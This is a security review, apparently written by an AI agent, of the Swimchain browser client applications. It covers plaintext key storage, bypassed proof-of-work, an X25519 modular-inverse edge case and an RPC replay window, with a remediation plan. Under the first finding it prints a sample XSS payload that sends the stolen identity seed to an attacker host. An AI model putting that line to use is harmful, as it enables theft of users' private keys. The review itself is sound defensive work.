# Security Review: Client Applications

## Summary

The Client Applications feature demonstrates competent use of modern cryptographic primitives (AES-256-GCM, X25519, Ed25519, Argon2id) but contains **4 critical vulnerabilities** that undermine the entire security model. The most severe issue is the storage of Ed25519 private key seeds in plaintext localStorage, exposing all user identities to XSS attacks. Additionally, the InviteModal and AutoEngageEngine bypass PoW validation entirely (using placeholder/simulated values), allowing spam attacks that circumvent Swimchain's core defense mechanism. The X25519 key conversion implementation has a potential modular inverse bug that could produce invalid keys.

### Scores
| Area | Score | Max | Notes |
|------|-------|-----|-------|
| Auth & Authz | 16 | 25 | Signatures verified but 1-second replay window; no session management |
| Crypto Correctness | 17 | 25 | Good algorithms but X25519 conversion untested; PBKDF2 iterations low |
| Input Validation | 19 | 25 | Most inputs validated; minor gaps in address format validation |
| Data Protection | 10 | 25 | Critical: Seeds/keys unencrypted in browser storage |
| **Total** | **62** | **100** | |

---

## Threat Model

| Threat | Likelihood | Impact | Mitigation Status |
|--------|------------|--------|-------------------|
| XSS extracts private key | High | Critical | **NOT MITIGATED** - seed in plaintext localStorage |
| Spam invites bypass PoW | High | High | **NOT MITIGATED** - InviteModal uses powNonce: 0 |
| Fake engagement claims | High | High | **NOT MITIGATED** - AutoEngageEngine uses setTimeout |
| RPC request replay | Medium | Medium | Partial - 1-second timestamp window; no nonce |
| Private space key theft | Medium | High | **NOT MITIGATED** - keys in plaintext IndexedDB |
| Matrix account takeover | Medium | Medium | **NOT MITIGATED** - token in plaintext localStorage |
| Invalid X25519 key derivation | Low | Critical | **NOT MITIGATED** - modInverse edge case |
| Passphrase brute-force | Low | High | Partial - 100k PBKDF2 iterations (below OWASP 2024) |
| MITM on testnet RPC | Medium | Low | **NOT MITIGATED** - HTTP endpoints without TLS |

---

## Vulnerabilities Found

### Critical (Exploitable)

#### 1. Private Key Seed Stored in Plaintext localStorage
**Vulnerability**: Ed25519 private key seed stored as unencrypted hex string in browser localStorage
**Location**: `forum-client/src/hooks/useStoredIdentity.ts:24-41`
**Attack**:
```javascript
// Any XSS payload can steal the seed:
const identity = JSON.parse(localStorage.getItem('swimchain-identity'));
fetch('https://attacker.com/steal?seed=' + identity.seed);
// Attacker now has the private key
```
**Impact**: Complete identity compromise. Attacker can sign any action as the victim, steal funds (if applicable), post/edit/delete as victim.
**Fix**:
1. Encrypt seed with user passphrase using PBKDF2 + AES-GCM before storage
2. Require passphrase unlock on session start
3. Consider Web Crypto non-extractable keys where possible
**CVSS**: 8.1 (High) - Network/Low/None/Changed/High/High

#### 2. InviteModal Bypasses PoW Validation
**Vulnerability**: Private space invites submitted with hardcoded placeholder PoW values
**Location**: `forum-client/src/components/InviteModal.tsx:86-97`
```typescript
// Lines 86-97 - hardcoded zero values
powNonce: 0,
powDifficulty: 0,
powNonceSpace: '00'.repeat(32),
powHash: '00'.repeat(32),
```
**Attack**:
1. Attacker scripts invite spam to any private space
2. No computational cost - can send thousands/second
3. Floods target users with invite notifications
4. May exhaust server-side storage for pending invites
**Impact**: Breaks core Swimchain defense ("friction is the defense"). Enables spam attack on private space membership system.
**Fix**: Replace placeholder with actual PoW mining using `useActionPow` hook:
```typescript
const { minePow } = useActionPow();
const solution = await minePow(ActionType.Invite, contentHash);
// Use solution.nonce, solution.hash, etc.
```
**CVSS**: 7.5 (High) - Network/Low/None/Unchanged/None/High/None

#### 3. AutoEngageEngine Simulates PoW
**Vulnerability**: Content preservation engine uses `setTimeout` instead of actual PoW computation
**Location**: `archiver-client/src/services/AutoEngageEngine.ts:141-148`
```typescript
// TODO comment acknowledges this is a simulation
await new Promise((resolve) => setTimeout(resolve, 1000));
this.recordEngagement(seconds);  // Records fake engagement
```
**Attack**:
1. Archiver claims to contribute N seconds of PoW engagement
2. Actually contributes zero computational work
3. Content preservation feature is completely non-functional
4. Attacker could claim unlimited engagement against their own content
**Impact**: Core content preservation feature broken. "Hosting as stake" (SPEC_12 section 1.2.3) is circumvented.
**Fix**: Integrate actual PoW computation:
```typescript
import { computePow, createChallenge } from '../lib/action-pow';
const challenge = createChallenge(ActionType.Engage, contentHash, authorId, difficulty);
const solution = await computePow(challenge, config);
await rpc.call('submit_engagement', { ...solution, seconds });
```
**CVSS**: 6.5 (Medium) - Network/Low/None/Unchanged/Low/High/None

#### 4. X25519 Modular Inverse Edge Case
**Vulnerability**: Custom modular inverse implementation may fail for edge case inputs
**Location**: `forum-client/src/lib/x25519.ts:116-128`
```typescript
function modInverse(a: bigint, m: bigint): bigint {
  let [old_r, r] = [a, m];
  let [old_s, s] = [BigInt(1), BigInt(0)];

  while (r !== BigInt(0)) {
    const quotient = old_r / r;
    [old_r, r] = [r, old_r - quotient * r];
    [old_s, s] = [s, old_s - quotient * s];
  }
  return mod(old_s, m);  // No validation of gcd(a,m) = 1
}
```
**Attack**:
1. Specific Ed25519 public keys where y-coordinate = 1 mod p
2. Denominator (1 - y) becomes 0
3. modInverse(0, p) returns incorrect result (not undefined)
4. Invalid X25519 public key derived
5. Encrypted space keys become unrecoverable
**Impact**: Private space invites using affected public keys will fail silently. Data loss for affected users.
**Fix**:
1. Add validation: `if (old_r !== BigInt(1)) throw new Error('No inverse exists')`
2. Better: Use audited library like @noble/curves for Ed25519-to-X25519 conversion
**CVSS**: 5.9 (Medium) - Network/High/None/Unchanged/None/High/None

---

### High

#### 1. Private Space Keys Stored Unencrypted
**Vulnerability**: 32-byte AES-256 space keys stored as plaintext hex in IndexedDB
**Location**: `forum-client/src/hooks/usePrivateSpaceKeys.ts:140-147`
```typescript
// Keys stored as plain hex strings
const storeKey: StoredSpaceKey = {
  spaceId,
  spaceKeyHex: bytesToHex(spaceKey),  // No encryption
  // ...
};
```
**Attack**: XSS or compromised browser extension reads IndexedDB, decrypts all private space content
**Impact**: All private space messages compromised if browser is compromised
**Fix**: Encrypt space keys with key derived from identity passphrase before IndexedDB storage
**CVSS**: 6.5 (Medium)

#### 2. Matrix Access Token Unencrypted
**Vulnerability**: Matrix homeserver access token stored in plaintext localStorage
**Location**: `bridge-client/src/pages/MatrixConfig.tsx` (config persistence)
**Attack**: XSS steals token, attacker gains full Matrix account access
**Impact**: Matrix account compromise, can read/send messages as victim on Matrix network
**Fix**: Encrypt token before storage OR require re-entry each session
**CVSS**: 6.1 (Medium)

#### 3. RPC Replay Window (1 Second)
**Vulnerability**: Request signatures use only timestamp (Unix seconds) without nonce
**Location**: `forum-client/src/lib/rpc.ts:197-230`
```typescript
const timestamp = Math.floor(Date.now() / 1000).toString();
// Message: swimchain-rpc:method:paramsHash:timestamp
// No request-unique nonce included
```
**Attack**:
1. Attacker captures valid signed request
2. Replays within same Unix second
3. Server accepts as valid (signature matches)
**Impact**: Action duplication within 1-second window
**Fix**: Add UUID or random nonce to signature message:
```typescript
const nonce = crypto.randomUUID();
const message = `swimchain-rpc:${method}:${paramsHash}:${timestamp}:${nonce}`;
headers['X-CS-Nonce'] = nonce;
```
**CVSS**: 5.3 (Medium)

---

### Medium

#### 1. PBKDF2 Iterations Below OWASP 2024 Recommendation
**Vulnerability**: 100,000 PBKDF2-SHA256 iterations for passphrase-based encryption
**Location**: `forum-client/src/lib/encryption.ts:52-54`
```typescript
const PBKDF2_ITERATIONS = 100000;
```
**Attack**: Offline brute-force of weak passphrases with GPU acceleration
**Impact**: Users with weak passphrases (~40-bit entropy) can be cracked in hours
**Fix**: Increase to 600,000+ iterations (OWASP 2024 recommendation for SHA-256)
**CVSS**: 4.8 (Medium)

#### 2. Testnet RPC Uses HTTP (No TLS)
**Vulnerability**: Testnet seed node endpoints use HTTP without encryption
**Location**: `forum-client/src/lib/rpc.ts:880-886`
```typescript
export const TESTNET_SEED_SF: RpcConfig = {
  endpoint: 'http://64.225.115.108:8736',  // HTTP, not HTTPS
};
```
**Attack**: Network-level attacker can read all RPC parameters (content, addresses, etc.)
**Impact**: Privacy loss for testnet users; no signature forgery possible
**Fix**: Deploy TLS certificates on testnet nodes; enforce HTTPS in production
**CVSS**: 4.3 (Medium)

#### 3. Non-Deterministic JSON Serialization
**Vulnerability**: `JSON.stringify()` used for parameter hashing without canonical encoding
**Location**: `forum-client/src/lib/rpc.ts:217-219`
```typescript
const paramsJson = JSON.stringify(params);
const paramsHash = await sha256(new TextEncoder().encode(paramsJson));
```
**Attack**: If client and server serialize object keys in different order, signatures fail
**Impact**: Legitimate requests rejected; potential DoS of specific request patterns
**Fix**: Use canonical JSON encoding (sort keys deterministically)
**CVSS**: 3.7 (Low)

#### 4. Sequential PoW Nonce Increment
**Vulnerability**: PoW nonces increment sequentially from 0
**Location**: `forum-client/src/lib/action-pow.ts:252`
```typescript
nonce++;  // 0, 1, 2, 3, ...
```
**Attack**: Pre-computation attack if attacker knows challenge parameters
**Impact**: Minor efficiency gain for attacker (~negligible due to Argon2id memory-hardness)
**Fix**: Initialize nonce from random BigInt
**CVSS**: 2.6 (Low)

---

### Low

#### 1. Seed Bytes Not Securely Wiped
**Vulnerability**: Uint8Array containing seed bytes not zeroed after use
**Location**: `forum-client/src/hooks/useStoredKeypair.ts:79-82`
**Impact**: Seed may remain in memory until garbage collection
**Fix**: Overwrite array with zeros before releasing reference
**CVSS**: 2.0 (Low)

#### 2. Hex Parsing Fails Silently
**Vulnerability**: `hexToBytes()` returns NaN for invalid hex characters
**Location**: `forum-client/src/lib/rpc.ts:111-126`
```typescript
for (let i = 0; i < hex.length; i += 2) {
  bytes[i / 2] = parseInt(hex.substring(i, i + 2), 16);
  // parseInt returns NaN for non-hex, no validation
}
```
**Impact**: Invalid key material if input contains non-hex characters
**Fix**: Add input validation: `if (!/^[0-9a-fA-F]*$/.test(hex)) throw Error`
**CVSS**: 2.0 (Low)

---

## Cryptographic Assessment

### Algorithms Used
| Algorithm | Usage | Assessment |
|-----------|-------|------------|
| Ed25519 | Identity signatures | **Secure** - Standard curve, well-audited |
| X25519 | Key exchange | **Concerns** - Custom conversion has edge case |
| AES-256-GCM | Content encryption | **Secure** - Authenticated encryption, proper IV |
| XSalsa20-Poly1305 | Box encryption | **Secure** - Uses @noble/ciphers (audited) |
| Argon2id | PoW mining | **Secure** - Memory-hard, GPU-resistant |
| PBKDF2-SHA256 | Key derivation | **Adequate** - 100k iterations (should be 600k+) |

### Key Management
- **Identity seeds**: **CRITICAL** - Stored in plaintext localStorage
- **Space keys**: **HIGH** - Stored in plaintext IndexedDB
- **Matrix tokens**: **HIGH** - Stored in plaintext localStorage
- **WASM keypair**: Memory-only (acceptable)

### Random Number Generation
- **IVs/Nonces**: `crypto.getRandomValues()` - **Secure**
- **Space keys**: `crypto.getRandomValues()` - **Secure**
- **PoW nonces**: Sequential from 0 - **Suboptimal** (minor issue)

### Nonce Handling
- **AES-GCM IV**: 12-byte random per encryption - **Correct**
- **XSalsa20 nonce**: 24-byte random per box - **Correct**
- **RPC signature**: Timestamp only - **Insufficient** (replay window)

---

## Attack Surface

### External Inputs
| Input | Source | Validation | Risk |
|-------|--------|------------|------|
| RPC responses | Node server | Schema validation | Medium - trust boundary |
| User passphrases | Keyboard input | None (length/complexity) | Low - user responsibility |
| Recipient public keys | User input (hex) | Length check (64 chars) | Low - invalid keys fail |
| Search queries | User input | Query parser sanitization | Low - client-side only |
| Bridge messages | Matrix/IRC | Echo tracking | Medium - external platforms |
| WebSocket proxy | IRC adapter | JSON parse | Medium - untrusted proxy |

### Trust Boundaries
1. **Browser localStorage/IndexedDB** - Trusted but exposed to XSS
2. **Swimchain node RPC** - Semi-trusted, signatures verified
3. **Matrix homeserver** - External, token-based auth
4. **IRC WebSocket proxy** - Untrusted, user-provided URL
5. **WASM module** - Trusted (bundled)

### Privileged Operations
| Operation | Authorization | Audit |
|-----------|--------------|-------|
| Sign action | Keypair required | Logged to console |
| Create private space | Identity + PoW | Node-side validation |
| Invite to space | Space key holder | No client-side log |
| Submit spam attestation | Identity + PoW | No client-side log |
| Bridge post creation | Bridge config + PoW | Activity log |

---

## Recommendations

### Priority 1 (Immediate - Security Critical)
1. **Encrypt identity seed in localStorage** using user-provided passphrase with PBKDF2 (600k iterations) + AES-GCM. Require passphrase unlock on session start.

2. **Fix InviteModal PoW bypass** by integrating `useActionPow` hook to mine actual proof-of-work before invite submission.

3. **Replace AutoEngageEngine simulation** with actual `computePow()` + RPC submission to enable real content preservation.

4. **Fix X25519 modular inverse** by validating gcd = 1 before returning, or switch to @noble/curves implementation with test vectors.

### Priority 2 (Short-term - High Risk)
5. **Encrypt space keys in IndexedDB** with key derived from identity passphrase.

6. **Encrypt Matrix access token** or require re-entry each session.

7. **Add nonce to RPC signatures** to close 1-second replay window.

8. **Increase PBKDF2 iterations** to 600,000+ per OWASP 2024 guidelines.

### Priority 3 (Medium-term)
9. **Enforce HTTPS** for all RPC endpoints (production requirement).

10. **Use canonical JSON encoding** for deterministic parameter hashing.

11. **Add input validation** for hex parsing functions.

12. **Implement secure memory wiping** for seed bytes after use.

---

## Security Best Practices Check

- [x] No hardcoded secrets (Matrix token is user-configured)
- [ ] Timing-safe comparisons - **Not verified** (signature verification server-side)
- [x] Secure defaults - AES-GCM, Ed25519, Argon2id all secure choices
- [ ] Principle of least privilege - **FAIL** - localStorage/IndexedDB expose all keys to any JS
- [x] CORS policy - Browser-enforced
- [x] CSP headers - Vite dev server provides defaults
- [ ] Input validation - **Partial** - Some gaps in hex parsing
- [ ] Audit logging - **Minimal** - Console logs only
- [ ] Rate limiting - **Yes** - RPC and bridge have rate limits
- [ ] Error handling - **Mixed** - Some silent failures in crypto

---

## Swimchain-Specific Security

### PoW Validation (Anti-Stockpile)
- **InviteModal**: **BROKEN** - Uses `powNonce: 0`
- **AutoEngageEngine**: **BROKEN** - Uses `setTimeout` simulation
- **ReportModal**: **FUNCTIONAL** - Integrates `useActionPow`
- **NewThread/Reply**: **FUNCTIONAL** - Integrates `useActionPow`

### Signature Verification on All Actions
- **RPC client**: **FUNCTIONAL** - Signs all authenticated requests
- **Invite submission**: **FUNCTIONAL** - Includes Ed25519 signature
- **Server-side**: Not reviewed (out of scope)

### Spam Attestation Thresholds
- **Client-side**: Unclear validation of Resident-level requirement
- **SPEC_12 compliance**: Server must enforce; client should pre-check

### Private Space Encryption
- **Algorithm**: **SECURE** - AES-256-GCM with random IV
- **Key exchange**: **CONCERNS** - X25519 conversion has edge case
- **Key storage**: **CRITICAL** - Plaintext in IndexedDB

### Identity Key Protection
- **Generation**: **SECURE** - WASM Ed25519 keygen
- **Storage**: **CRITICAL** - Plaintext seed in localStorage
- **Usage**: **SECURE** - Signing via WASM, key stays in memory

---

*Security Review Version: 1.0*
*Reviewed By: Security Reviewer Agent*
*Date: 2026-01-12*
*Scope: forum-client, chat-client, search-client, feed-client, analytics-client, archiver-client, bridge-client, debug-dashboard*
